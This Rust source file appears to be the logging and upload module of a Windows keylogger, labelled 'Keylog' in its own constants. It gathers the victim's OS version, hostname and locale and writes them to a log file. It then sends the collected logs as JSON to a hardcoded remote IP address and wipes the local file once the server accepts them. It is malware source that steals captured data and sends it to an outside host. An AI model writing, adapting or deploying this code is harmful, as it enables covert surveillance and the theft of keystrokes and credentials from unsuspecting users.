use serde::{Deserialize, Serialize};
use std::sync::Arc;

use tokio::{
    fs::File,
    io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter},
    sync::Mutex,
};

static SEPARATOR: &str = "-----";
static INIT: &str = "Keylog";
static API: &str = "http://104.236.89.67:5000/api";


pub struct LogFile {
    file: File,
    filename: String,
}

impl LogFile {
    pub fn new(filename: String, file: File) -> LogFile {
        return LogFile { file, filename };
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Info {
    pub metadata: Vec<String>,
    pub filename: String,
    pub logs: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Response {
    pub message: String,
    pub status: bool,
}

pub async fn send_info_data(
    file: Arc<Mutex<LogFile>>,
    client: reqwest::Client,
) -> Result<bool, reqwest::Error> {

    let mut logs: Vec<String> = Vec::new();
    //Lock the file structure for avoid concurrency errors.
    let lock_file = file.lock().await;

    let mut clone_file = lock_file.file.try_clone().await.expect("Async error");
    clone_file
        .seek(std::io::SeekFrom::Start(0))
        .await
        .expect("Async error");

    //Read all the content of the file and store it in a vector.
    let reader = BufReader::new(clone_file);
    let mut lines = reader.lines();
    while let Some(element) = lines.next_line().await.expect("Async error") {
        logs.push(element);
    }

    let mut iter: usize = 0;
    let mut metadata: Vec<String> = Vec::new();

    //separate the logs and metadata 
    if logs.len() > 0 && logs.get(iter).expect("IO error") == INIT {
        while logs.get(iter).expect("IO error") != SEPARATOR {
            iter += 1;
        }
        metadata = logs.drain(0..iter).collect();
        logs.remove(0);
    }

    let info = Info {
        metadata,
        filename: lock_file.filename.clone(),
        logs,
    };

    //send the data to the API
    let target =  format!("{}/logs", API);
    let response = client.post(&target).json(&info).send().await?;

    // if there are not errors in the response, delete all the content of the file
    let mut result = true;
    match response.error_for_status() {
        Ok(_) => {
            clone_file = lock_file.file.try_clone().await.expect("Async error");
            clone_file
                .seek(std::io::SeekFrom::Start(0))
                .await
                .expect("Async error");
            clone_file.set_len(0).await.expect("Async error");
        }
        Err(_) => result = false,
    };

    return Ok(result);
}

//log the metadata
pub async fn log_header(file: Arc<Mutex<LogFile>>) {
    use winapi::um::winnls::GetUserDefaultLocaleName;

    let os_info = {
        let info = os_info::get();
        format!(
            "OS: type: {} - Version: {}\n",
            info.os_type(),
            info.version()
        )
    };

    let hostname = format!(
        "Hostname: {}\n",
        hostname::get_hostname().unwrap_or("_NO_HOSTNAME_".to_string())
    );

    let locale = unsafe {
        const LEN: i32 = 85; 
        let mut buf = vec![0 as u16; LEN as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);

        //find the null terminator
        let mut len = 0;
        buf.iter().enumerate().for_each(|(i, c)| {
            if *c == 0 && len == 0 {
                len = i;
            }
        });
        String::from_utf16_lossy(buf[0..len].as_mut())
    };

    log(file.clone(), format!("{}\n", INIT.to_string())).await;
    log(file.clone(), os_info).await;
    log(file.clone(), hostname).await;
    log(file.clone(), format!("Locale: {}\n", locale)).await;
    log(file.clone(), format!("{}\n", SEPARATOR.to_string())).await;
}

pub async fn log(file: Arc<Mutex<LogFile>>, s: String) -> Result<(), tokio::io::Error> {
    #[cfg(debug_assertions)]
    {
        print!("{}", s);
    }

    //Lock the file structure for avoid concurrency errors.
    let lock_file = file.lock().await;
    let mut writer = BufWriter::new(lock_file.file.try_clone().await.expect("Async error"));

    //Append the log to the file
    match writer.write(s.as_bytes()).await {
        Err(e) => {
            println!("Couldn't write to log file: {}", e)
        }
        _ => {}
    };
    match writer.flush().await {
        Err(e) => {
            println!("Couldn't flush log file: {}", e)
        }
        _ => {}
    };
    return Ok(());
}
